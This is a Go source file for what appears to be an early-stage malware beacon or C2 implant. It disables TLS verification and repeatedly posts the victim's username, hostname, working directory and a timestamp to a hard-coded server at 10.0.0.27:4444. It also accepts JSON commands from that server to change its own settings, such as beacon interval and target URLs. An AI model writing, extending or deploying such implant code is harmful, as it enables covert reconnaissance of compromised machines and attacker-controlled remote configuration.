package main

import (
    "net/http"
    "net/url"
    "io/ioutil"
    "strconv"
    "encoding/json"
    //"bytes"
    "os"
    "fmt"
    "crypto/tls"
    "time"
    "os/user"
)

var SETTINGS map[interface{}]interface{}

func init_settings() {
    SETTINGS = map[interface{}]interface{}{
        "urls":make([]string, 1),
        "attempts":"3",
        "beacon":"10",
        "debug":"true",
    }
    urls := []string{"https://10.0.0.27:4444/index.php?id=1"}
    SETTINGS["urls"] = urls
    SETTINGS["url"] = urls[0]
    /*
    SETTINGS["urls"]=make([]string, 1)
    SETTINGS["urls"]=append(SETTINGS["urls"].([]string), "https://10.0.0.27:4444/index.php?id=1")
    SETTINGS["attemtps"]=3
    SETTINGS["beacon"]=10
    SETTINGS["debug"]=true
    */
}


/*
resp, err := http.Get("http://example.com/")
...
resp, err := http.Post("http://example.com/upload", "image/jpeg", &buf)
...
resp, err := http.PostForm("http://example.com/form",
	url.Values{"key": {"Value"}, "id": {"123"}})
*/


/*

def get_target_info():
    return {
        "usr":getpass.getuser(),
        "hostname":socket.gethostname(),
        "cwd": os.getcwd(),
        "time": time.time()
    }


*/
func ignore(err error){
    if err != nil {
        fmt.Println(err)
    }
}

func get_beacon() url.Values {
    user, err := user.Current()
    ignore(err)
    name, err := os.Hostname()
    ignore(err)
    dir, err := os.Getwd()
    ignore(err)
    var timestamp int32
    timestamp = int32(time.Now().Unix())

    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
}

func do_cmd(body []byte) {
    fmt.Println("in do_cmd")
    var j map[string]interface{}
    json.Unmarshal(body, &j)
    fmt.Printf("Unmarshalled: %s\n", j)
   
    for cmd, record := range j {
        fmt.Printf("CMD:%s\nArgs:%s\n", cmd,record)
        if cmd == "set" {
            if rec, ok := record.([]interface{}); ok {
                var j_inner []interface{}
                json.Unmarshal([]byte(rec[1].(string)), &j_inner)
                if j_inner != nil {
                    fmt.Printf("Unmarshalled (inner): %s\n", j_inner)
                    rec[1] = j_inner
                }
               SETTINGS[rec[0]] = rec[1]
               fmt.Printf("SETTINGS['%s']:%s  (%T)\n", rec[0],rec[1], rec[1])
               /* 
                for k, v := range rec {
                    SETTINGS[k] = v
                    fmt.Printf("SETTINGS[%s]:%s\n", k,v)
                }
                */
            } else {
                fmt.Printf("record is %T , not a map[string]interface{}: %v\n", record, record)
            }
        } else {
            fmt.Printf("CMD:%s no supported!", cmd)
        }
        
    }
    /* 
    if cmd, ok := j["set"].(map[string]interface{}); ok {
        fmt.Printf("%s\n", cmd)
        for k, v := range cmd {
        }
    } else {
        fmt.Printf("%s had no work\n", j)
    }
    */
}

func atoi(s string) int{
    i, _ := strconv.Atoi(s)
    return i
}

func sleep(sec int){
    time.Sleep(time.Duration(sec)*time.Second)
}

func main() {
    init_settings()
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    for {
        //url = "https://10.0.0.27:4444/index.php"
        //resp, err := http.Get("https://10.0.0.27:4444") 
        b := get_beacon()
        err_count := 0
        attempts:= atoi(SETTINGS["attempts"].(string))
        for err_count <= attempts {
            fmt.Printf("%d attempts remaining\n", attempts - err_count)
            //urls := SETTINGS["urls"].([]string)
            //fmt.Printf("URL: %v\n", urls )
            //fmt.Printf("URL: %s\n", urls[0] )
            //resp, err := http.PostForm((SETTINGS["urls"].([]string))[0], b)
            resp, err := http.PostForm(SETTINGS["url"].(string), b)
            if err != nil {
                fmt.Println(err)
                err_count++
                time.Sleep(time.Second)
            } else {
                fmt.Println("hello world")
                fmt.Println(resp)
                bodyBytes, _ := ioutil.ReadAll(resp.Body)
                fmt.Printf("Body:%s\n", string(bodyBytes))
                do_cmd(bodyBytes)
            }
            break
        }
        sleep(atoi(SETTINGS["beacon"].(string)))
    }
}
